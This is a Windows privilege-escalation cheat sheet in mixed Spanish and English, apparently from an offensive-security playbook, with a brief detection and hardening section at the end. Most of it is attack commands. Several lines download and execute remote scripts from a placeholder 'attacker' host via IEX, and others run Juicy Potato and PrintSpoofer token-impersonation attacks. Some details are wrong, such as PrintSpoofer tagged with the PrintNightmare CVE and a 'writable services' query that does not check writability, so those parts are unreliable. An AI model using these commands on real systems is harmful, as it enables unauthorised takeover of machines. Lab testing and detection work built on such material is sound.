---
title: Windows Privilege Escalation
phase: post-explotacion
platform: windows
tags: [windows, privesc, winpeas, potato]
risk: critical
attack_tactic: TA0004
attack_technique: T1068
data_sources: [security-events, sysmon, powershell-logs]
last_review: 2026-05-25
---

# Windows Privilege Escalation

### Objetivo

Escalar de usuario raso a administrador o system en Windows abusando de servicios, registro, schedul tasks, o binarios inseguros.

### Enumeration Scripts

```powershell
# winPEAS
.\winPEASx64.exe

# Sherlock (PowerShell)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Sherlock.ps1')
Find-AllVulns

# PowerUp
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerUp.ps1')
Invoke-AllChecks
```

### Service Misconfigurations

```powershell
# enumerate services
sc query
Get-Service | Where-Object {$_.Status -eq 'Running'}

# Check for unquoted service paths
wmic service get Name,PathName,StartMode,State

# SeChangeNotifyPrivilege / SeImpersonatePrivilege (token kidnapping)
# Printspoofer
.\PrintSpoofer.exe -i -c whoami
```

### potato-family (token privilege)

```powershell
# Rotten Potato
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/RottenPotato.ps1')"

# Juicy Potato
.\jp.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami"

# Printspoofer (CVE-2021-1675)
.\PrintSpoofer.exe -c "whoami"
```

### Registry Misconfigs

```powershell
# Autoruns
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run*"
Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run*"

# AlwaysInstallElevated
reg query "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
reg query "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
```

### One-liners

```powershell
# Check for bypass UAC
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

# Enumerate local admins
net localgroup administrators

# Find writable services
Get-WmiObject -Class Win32_Service | Where-Object {$_.StartMode -eq 'Auto' -and $_.State -eq 'Running'} | Select-Object Name, PathName
```

### Detección y Mitigación

- **Visibilidad:** Sysmon EID 1, 10 (process access), security events 4672 (special privileges), 4703 (token adjustment).
- **Hardening:** Disable SeImpersonatePrivilege, no unquoted service paths, no AlwaysInstallElevated, apply patches.

### Validación de Cobertura

- **Prueba técnica:** Run Juicy Potato / PrintSpoofer in lab.
- **Criterio de éxito:** Alert on token privilege manipulation; EID 4672 with suspicious process.
